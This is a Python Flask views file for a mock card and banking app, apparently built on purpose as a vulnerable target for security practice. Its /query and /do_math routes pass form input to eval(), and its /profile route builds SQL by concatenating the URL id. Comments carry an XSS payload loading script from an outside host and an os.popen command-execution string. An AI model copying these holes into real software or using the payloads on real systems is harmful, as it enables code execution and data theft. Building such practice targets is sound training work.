from flask import render_template_string, request, render_template, flash, current_app
from flask_user import current_user, login_required
import re
import datetime
from . import app
from .models import User
from ..main import app as main_app

from ..main import db
#  from ..main import user_manager, db_adapter


# Example Payload
# http://localhost:4141/user/sign-in?next=/query%22%3E%3Cscript%20src=%22http://v.mewy.pw:9447/js/payload%22%3E%3C/script%3E
#
#
@main_app.before_first_request
def populate():
    with main_app.app_context():
        sample_data = [
            ('Jordan Steele', '4344314677456875', datetime.date(2017, 10, 4), '259'),
            ('Kevin Young', '3337172048758176', datetime.date(2017, 10, 21), '924'),
            ('Amy Watkins', '4940352169091', datetime.date(2017, 10, 7), '9132'),
            ('Michael Duncan', '4418865175657', datetime.date(2017, 11, 1), '823'),
            ('Zachary Smith', '4281651953326354', datetime.date(2017, 10, 31), '4562'),
            ('Lynn Stephens', '210046374987252', datetime.date( 2017, 10, 12), '742'),
            ('Jill Drake', '3158659430349925', datetime.date(2017, 10, 7), '105'),
            ('Zachary Byrd', '30103621914700', datetime.date(2017, 10, 21), '411'),
            ('Robert Elliott', '5253001401244570', datetime.date(2017, 10, 24), '273'),
            ('Thomas Dudley', '4538021542921415', datetime.date( 2017, 10, 16), '438'),
            ('Ashley Stevens', '869922766135920', datetime.date(2017, 10, 6), '395'),
            ('Rachel Hernandez', '342151481567426', datetime.date(2017, 10, 16), '205'),
            ('Andrea Jackson', '180021910003555', datetime.date( 2017, 11, 1), '201'),
            ( 'Christopher Hernandez', '4358831656749569', datetime.date(2017, 10, 19), '8207'),
            ('Lauren Johnson', '4209860405835479', datetime.date( 2017, 10, 27), '0657')
        ]
        for rec in sample_data:
            new_user = User(username = rec[0], password="password", credit_card = rec[1], expiry = rec[2], ccv = rec[3])

            db.session.add(new_user)
        db.session.commit()


@app.route('/')
def home():
    return render_template("home.html")

# __import__('os').popen('ls').read()

@app.route("/query", methods=['GET', 'POST'])
@login_required
def query():
    user = current_user
    if request.method == 'POST':
        if 'eval' not in request.form:
            flash("Please fill in the withdrawl amount")
            return render_template("query.html", user=user)
        final = eval(request.form.get('eval'))
        try:
            if final < 0:
                flash("Insufficient balance")
                return render_template("query.html", user=user)
        except:
            flash("Error occured, {} is not a number".format(final))
            return render_template("query.html", user=user)

        flash("Debited {}".format(final))
        user.balance = final
        db.session.commit()

    return render_template("query.html", user=user)


@app.route("/profile", methods=['GET', 'POST'])
@app.route("/profile/", methods=['GET', 'POST'])
@app.route("/profile/<id>", methods=['GET', 'POST'])
@login_required
def profile(id=''):
    if not id:
        user = current_user
    else:
        resp = db.engine.execute(
            "select id, username, credit_card, expiry, ccv from user where id="
            + id)
        res = [r for r in resp]
        if not res:
            flash("No user with id: {} found".format(id))
            user = current_user
            return render_template("profile.html", user=user)
        print(res[0][3], type(res[0][3]))
        user = User(
            username=res[0][1],
            credit_card=res[0][2],
            expiry=datetime.datetime.strptime(res[0][3], '%Y-%m-%d %H:%M:%S.%f') if res[0][3] else '',
            ccv=res[0][4])

    if request.method == 'POST':
        required_fields = ['credit_card', 'expiry', 'ccv', 'username']
        for field in required_fields:
            if field not in request.form:
                flash("Please fill in all the fields")
                return render_template("profile.html", user=user)

        try:
            expiry_date = datetime.datetime.strptime(request.form.get('expiry'), '%d/%m/%Y')
        except Exception as e:
            flash("Invalid date. Please use the dd/mm/yyyy format {}".format(
                request.form.get("expiry")))
            return render_template("profile.html", user=user)

        try:
            ccv = int(request.form.get('ccv'))
        except:
            flash('Invalid CCV. Please enter an integer')
            return render_template("profile.html", user=user)

        try:
            cc = int(request.form.get('credit_card').replace(' ', ''))
        except:
            flash("Invalid Credit Card Number")
            return render_template("profile.html", user=user)

        update_user = User.query.filter_by(
            username=request.form.get("username")).update({
                'credit_card': request.form.get("credit_card"),
                'expiry': expiry_date,
                'ccv': ccv
            })
        db.session.commit()
        flash("User {} updated".format(request.form.get('username')))

    return render_template("profile.html", user=user)


@app.route("/do_math", methods=['POST'])
def do_math():
    return eval(request.form.get('query'))
